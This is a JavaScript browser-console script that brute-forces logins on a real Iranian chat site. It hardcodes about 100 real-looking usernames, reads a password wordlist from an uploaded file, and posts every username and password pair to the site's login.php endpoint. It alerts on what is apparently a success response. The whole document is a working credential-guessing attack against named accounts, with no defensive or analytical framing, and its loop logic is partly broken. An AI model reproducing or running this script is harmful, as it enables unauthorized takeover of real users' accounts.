		$('<input type="file" name="file" id="file">').appendTo('.btable');
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms));}
const user=`
2pack
AMIRقم
Admin
AlexX
Alireza
Alireza 41
Alireza123123
Away	tiger_
Daniy
Davood
Hadi_42
Herbod1
Hesam1
HāSťI
Kami
LORD EDWARD
Maryam13700
Marys
Mehdi nurse27qaz
Milad_Uk
Mitra20
Mohseennn
Nahalll
Omiidam 31
Parsa St
Peyman
ROZa
Rezaa
Rocky
Sabaaa
Samar
Saniya
Shmimm
Wolf
Zeinab
ZiiZiiGooLoo
alaKi
ali202020
alishah677
arsha
avaa
b374k
behnam000
mRamir
mahbobe
mahsaaa
mamad_ahwazi
mehdihesamidr
miss-tina
mohammad2003
rojan
samira24
secret
sepehr
tiger_
آرش40
آلما
آیسووو ۱۷
احمد اهوازی
الی1
امین متاهل
بهار
بهزادی
ثناخانوم
خدایا شکرت
دختره مامانی
دریای محبت
رامین سیلور
سبحان
سپیده۲۶
شاهین ۲۶
عادل المصري
عباس
علی رشتی
علی ۹۳
فررشتم
لوایاتان
لیلی ۳
محمد1
ملیحه
مهدی تبریز
مهدیس18
مهرداد مرام
مونا
مینا 22
نازنینم
نگارشون
نیما۶۳
هاله
هلما۳۰
هووووووووووف
پارسااا
پرستش۷۴
کارن ۶۶۲۲
کامران_
کنجکاو اهوازی
گل رویایی
彡ɑlɪɍɛẕɑɑɑ彡
𝓜𝓲𝓵𝓪𝓭 𝓞𝓻𝓲𝓰𝓲𝓷𝓪𝓵`;

document.getElementById('file').onchange =  function(){

  var file = this.files[0];

  var reader = new FileReader();
  reader.onload = async function(progressEvent){
var users = user.split(/\n/gi);
for(var ii =0;ii<users.length;){


    // By lines
    var lines = this.result.split('\n');
 console.log(lines.length);


    for(var line = 0; line < lines.length; ){
  

 const xhttp = new XMLHttpRequest();
  xhttp.onload = function() {
 // ;

if(this.responseText=="3") alert(lines[line]);


  }
 

xhttp.open("POST", "https://mihancp.ir/mihan/system/encoded/login.php");
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
xhttp.send("password="+lines[line]+"&username="+users[ii]+"");
// console.log(lines[line]);



line++


if(line == lines.length){++ii
}
    }





}
  };
  reader.readAsText(file);
};
